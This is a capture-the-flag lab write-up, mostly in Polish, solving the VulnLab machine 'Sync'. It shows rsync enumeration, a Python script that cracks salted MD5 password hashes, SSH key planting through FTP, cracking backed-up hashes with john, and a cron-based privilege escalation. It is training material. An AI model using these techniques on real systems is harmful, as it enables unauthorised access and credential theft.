# Sync
Linux, Easy, created by **xct**

```
21/tcp  open  ftp     vsftpd 3.0.5
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
873/tcp open  rsync   (protocol version 31)

```
```
feroxbuster -u http://10.10.78.42/ -w ~/raft.txt -t 100                                                                                                                                      
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.78.42/
 🚀  Threads               │ 100
 📖  Wordlist              │ /home/kali/raft.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       25l       60w     1392c http://10.10.78.42/
302      GET        0l        0w        0c http://10.10.78.42/dashboard.php => index.php
200      GET       25l       60w     1392c http://10.10.78.42/index.php
302      GET        0l        0w        0c http://10.10.78.42/logout.php => index.php
```

ale zacznę od tego rsync, bo po pierwsze wydaje się ciekawy, a po drugie maszynka nazywa się `sync` hehe

![{1614210B-1E5B-4FA5-907B-DB1A73BA96BC}](https://github.com/user-attachments/assets/1ada379a-9792-4bc4-bf60-0074a8c87d33)

`rsync -av rsync://10.10.78.42/httpd ./httpd` for download

![{374FB9A8-6D61-4626-B35E-B0E87AD135B4}](https://github.com/user-attachments/assets/37d141d7-26f3-4511-b615-70e540a2879b)

![{FEBBC88F-7A27-4966-8D3E-1F41154A8B1E}](https://github.com/user-attachments/assets/ffce0593-2c6b-4559-a21e-707ce001abde)

dobra lekko się zdziwiłem. Trzeba pogrzebać.

![{73B4F470-068A-4DBA-A0E1-3F6E35058930}](https://github.com/user-attachments/assets/02c5911d-28d1-4b9f-90b3-5bf9e7fd6c42)

dobra po prostu dodali sól w postacie tego na screenie `6c<hehehe>de01e`.
```
$hash = md5("$secure|$username|$password");
```

```
mport hashlib

def crack_hash(hash_to_crack, secure, username, wordlist_path):
    with open(wordlist_path, "r", encoding="latin-1") as wordlist:
        for password in wordlist:
            if hashlib.md5(f"{secure}|{username}|{password.strip()}".encode()).hexdigest() == hash_to_crack:
                return password.strip()
    return None

secure = "6c4972f3717a5e881e282ad3105de01e"
wordlist_path = "/usr/share/wordlists/rockyou.txt"

hash1 = "7658a2741c9df3a97c819584db6e6b3c"
username1 = "admin"

hash2 = "a0de4d7f81676c3ea9eabcadfd2536f6"
username2 = "triss"

print(f"Hash {hash1}: {crack_hash(hash1, secure, username1, wordlist_path)}")
print(f"Hash {hash2}: {crack_hash(hash2, secure, username2, wordlist_path)}")
```

dostaliśmy hasło dla `triss`

![{782D91A8-7C71-4030-A377-A38905FBEA1E}](https://github.com/user-attachments/assets/5b272962-be18-4df0-9220-505a59b615ab)

do ftp pasuje

on ftp
```
mkdir .ssh
cd .ssh
```

on kali
```
ssh-keygen -f id_rsa
cp id_rsa.pub authorized_keys
```
on ftp
```
put authorized_keys
```
on kali
```
chmod 400 id_rsa
ssh triss@10.10.78.42 -i id_rsa
```

![{46D391E9-D298-46EB-895D-DC6B8FB42ECD}](https://github.com/user-attachments/assets/2e5d042d-d416-438c-8e20-0426ee9955be)

Pierwsze co wygląda ciekawie to `/backup`

![{30C241E3-01C1-4B99-9ECD-1471B49AB2A4}](https://github.com/user-attachments/assets/83341463-9bf5-4394-aae7-9059191e9375)

![{91A828B9-DAEC-4E5A-9B41-3CDFAF001EA9}](https://github.com/user-attachments/assets/d2134838-8a8b-4816-9941-40e2a8f4e4a9)

nie chce mi się transferować plików więc robię to base64 xd

![{4B8C7715-41D4-4F46-BC4A-B390BA54AD95}](https://github.com/user-attachments/assets/90cc6fda-4e76-45de-ac24-d9fc3cc1d053)

![{F7A8972D-4CC9-4D6B-8189-749AB715D9C3}](https://github.com/user-attachments/assets/bf7a2b49-3b88-49f8-8572-6b1d54bc1020)

![{2393241B-0790-497E-B07A-89AB5D8391FE}](https://github.com/user-attachments/assets/806b56d6-fc6d-49d5-8ba7-e887bc3726f8)

no cóż. Chyba najprostsza maszynka na vulnlab się zapowiada

![{1FA65177-328A-4D18-851E-A60A520EA24A}](https://github.com/user-attachments/assets/7676fb08-bc78-4b53-8e87-2bb8ddde2053)

![{7192CC6D-ADC9-4C80-A402-4905E6BAF865}](https://github.com/user-attachments/assets/c9a72b9b-54f0-4f3d-b614-85417887c67f)

```
john hashes4 -w=~/SHARED/lists/rockyou.txt --format=crypt
```

- po 3 sek mamy 2 hasła i jedno nalezy do triss więc drugie pewnei do kolejego usera. PRzerywam, bo zapewne to liniowa maszynka.

 ![{33A31FA7-12E8-48B2-9D49-5EDFB7070B70}](https://github.com/user-attachments/assets/006cd9f9-8b3a-46e0-b84f-979454f400f1)

and we are `sa` now

![{0307CB3D-6A2E-455D-BD27-22F66F29CFE9}](https://github.com/user-attachments/assets/3d8aaea4-50d6-490c-9b97-b30c6d51d436)

![{D18BEE4A-DFB6-4BB5-8D14-2FE0F516DC0D}](https://github.com/user-attachments/assets/f1348ca6-8e4d-4536-912c-66ec52a2493b)

na 99% tam lata cron jakiś, który to uruchamia. W ciemno wpisuję komende i czekam ze 2 minutki

![{BCD1C690-13ED-46C4-8A1A-99EBBA9282F1}](https://github.com/user-attachments/assets/39f2417a-b79f-437a-8659-b84aa0ded705)

i tyle

